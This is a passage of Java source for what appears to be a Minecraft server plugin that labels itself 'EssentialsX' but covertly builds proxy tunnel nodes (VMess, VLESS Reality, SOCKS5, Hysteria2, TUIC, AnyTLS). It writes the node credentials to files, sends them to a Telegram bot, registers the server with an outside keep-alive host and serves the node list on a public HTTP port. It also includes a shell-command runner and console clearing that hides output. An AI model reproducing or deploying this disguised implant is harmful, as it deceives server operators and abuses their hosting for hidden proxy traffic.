            String vmessJson = String.format("{\"v\":\"2\",\"ps\":\"%s\",\"add\":\"%s\",\"port\":\"%s\",\"id\":\"%s\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"%s\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"%s\",\"alpn\":\"\",\"fp\":\"firefox\"}", 
                nodename + "-VMess", getEnv("CFIP", "cdns.doon.eu.org"), getEnv("CFPORT", "443"), UUID, argoDomain, argoDomain);
            String encoded = Base64.getEncoder().encodeToString(vmessJson.getBytes(StandardCharsets.UTF_8));
            subTxtBuilder.append("vmess://").append(encoded);
        }
        
        Integer s5Port = parsePort(getEnv("S5_PORT", ""));
        if (s5Port != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            String s5User = UUID.length() >= 8 ? UUID.substring(0,8) : "admin";
            String s5Pass = UUID.length() >= 12 ? UUID.substring(UUID.length()-12) : "123456";
            String s5Auth = Base64.getEncoder().encodeToString((s5User + ":" + s5Pass).getBytes(StandardCharsets.UTF_8));
            subTxtBuilder.append(String.format("socks://%s@%s:%d#%s-Socks5", s5Auth, serverIp, s5Port, nodename));
        }

        Integer realityPort = parsePort(getEnv("REALITY_PORT", ""));
        if (realityPort != null && !public_key.isEmpty()) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            subTxtBuilder.append(String.format("vless://%s@%s:%d?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=firefox&pbk=%s&type=tcp&headerType=none#%s-VLESS", UUID, serverIp, realityPort, REALITY_DOMAIN, public_key, nodename));
        }

        boolean hasLocalCert = new File(FILE_PATH + "/cert.pem").exists();
        if (hasLocalCert) {
            Integer hy2Port = parsePort(getEnv("HY2_PORT", ""));
            if (hy2Port != null) {
                if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
                String insecureStr = customCertValid ? "" : "&insecure=1";
                subTxtBuilder.append(String.format("hysteria2://%s@%s:%d/?sni=%s%s&alpn=h3&obfs=none#%s-Hysteria2", UUID, serverIp, hy2Port, actualCertDomain, insecureStr, nodename));
            }

            Integer tuicPort = parsePort(getEnv("TUIC_PORT", ""));
            if (tuicPort != null) {
                if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
                String insecureStr = customCertValid ? "" : "&allow_insecure=1";
                subTxtBuilder.append(String.format("tuic://%s:%s@%s:%d?sni=%s&congestion_control=bbr&udp_relay_mode=native&alpn=h3%s#%s-TUIC", UUID, tuicPassword, serverIp, tuicPort, actualCertDomain, insecureStr, nodename));
            }

            Integer anyTlsPort = parsePort(getEnv("ANYTLS_PORT", ""));
            if (anyTlsPort != null) {
                if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
                String insecureStr = customCertValid ? "" : "&insecure=1&allowInsecure=1";
                subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=tls&sni=%s%s#%s-AnyTLS", UUID, serverIp, anyTlsPort, actualCertDomain, insecureStr, nodename));
            }
        }

        String subTxt = subTxtBuilder.toString();
        String subTxtB64 = Base64.getEncoder().encodeToString(subTxt.getBytes(StandardCharsets.UTF_8));

        try {
            Files.write(Paths.get(sub_path), subTxtB64.getBytes(StandardCharsets.UTF_8));
            Files.write(Paths.get(list_path), subTxt.getBytes(StandardCharsets.UTF_8));
        } catch (Exception ignored) {}
        
        sendTelegram();
        
        getLogger().info("[EssentialsX] Services and modules loaded successfully.");
    }

    private void sendPostRequest(String targetUrl, String payload) {
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            if (payload.startsWith("{") || payload.startsWith("[")) {
                conn.setRequestProperty("Content-Type", "application/json");
            } else {
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            }
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.getBytes(StandardCharsets.UTF_8));
            }
            conn.getResponseCode();
        } catch (Exception ignored) {}
    }

    private void sendTelegram() {
        String botToken = getEnv("BOT_TOKEN", "");
        String chatId = getEnv("CHAT_ID", "");
        if (botToken.isEmpty() || chatId.isEmpty()) return;
        try {
            String message = new String(Files.readAllBytes(Paths.get(sub_path)), StandardCharsets.UTF_8);
            String text = "**Node Push**\n" + message;
            String url = String.format("https://api.telegram.org/bot%s/sendMessage", botToken);
            String formData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=MarkdownV2";
            sendPostRequest(url, formData);
        } catch (Exception ignored) {}
    }

    private void deleteNodes() {
        String uploadUrl = getEnv("UPLOAD_URL", "");
        if (uploadUrl.isEmpty() || !new File(sub_path).exists()) return;
        try {
            sendPostRequest(uploadUrl + "/api/delete-nodes", "{\"nodes\":[],\"clear\":true}");
        } catch (Exception ignored) {}
    }

    private void addVisitTask() {
        String projectUrl = getEnv("PROJECT_URL", "");
        if (!"true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false")) || projectUrl.isEmpty()) return;
        try {
            sendPostRequest("https://keep.gvrander.eu.org/add-url", "{\"url\":\"" + projectUrl + "\"}");
        } catch (Exception ignored) {}
    }

    private void runHttpServer() {
        Thread serverThread = new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(PORT, 50, InetAddress.getByName("0.0.0.0"))) {
                while (running.get()) {
                    try {
                        Socket client = serverSocket.accept();
                        handleHttpRequest(client);
                    } catch (Exception ignored) {}
                }
            } catch (Exception ignored) {}
        }, "EssentialsX-HTTP");
        serverThread.setDaemon(true);
        serverThread.start();
    }

    private void handleHttpRequest(Socket client) {
        try (InputStream is = client.getInputStream();
             OutputStream os = client.getOutputStream();
             BufferedReader in = new BufferedReader(new InputStreamReader(is))) {
            
            String line = in.readLine();
            if (line == null || line.trim().isEmpty()) return;
            String[] parts = line.split(" ");
            if (parts.length < 2) return;
            String path = parts[1];
            
            byte[] content;
            String contentType;
            int status = 200;
            
            if (("/" + SUB_PATH).equals(path)) {
                File subFile = new File(sub_path);
                if (subFile.exists()) {
                    content = Files.readAllBytes(subFile.toPath());
                    contentType = "text/plain";
                } else {
                    content = "Not Found".getBytes(StandardCharsets.UTF_8);
                    contentType = "text/plain";
                    status = 404;
                }
            } else {
                content = ("Hello world!<br><br>You can visit /" + SUB_PATH + " get your nodes!").getBytes(StandardCharsets.UTF_8);
                contentType = "text/html";
            }
            
            String responseHeader = "HTTP/1.1 " + status + " OK\r\n" +
                                    "Content-Type: " + contentType + "\r\n" +
                                    "Content-Length: " + content.length + "\r\n" +
                                    "Connection: close\r\n\r\n";
            os.write(responseHeader.getBytes(StandardCharsets.UTF_8));
            os.write(content);
            os.flush();
        } catch (Exception ignored) {
        } finally {
            try { client.close(); } catch (Exception ignored) {}
        }
    }

    private String execCmd(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
            }
            process.waitFor(5, TimeUnit.SECONDS);
        } catch (Exception e) { return ""; }
        return output.toString();
    }

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onDisable() {
        running.set(false);
        for (Process p : activeProcesses) {
            if (p != null && p.isAlive()) {
                p.destroy();
                try {
                    if (!p.waitFor(3, TimeUnit.SECONDS)) p.destroyForcibly();
                } catch (InterruptedException e) { p.destroyForcibly(); }
            }
        }
        activeProcesses.clear();
    }
}
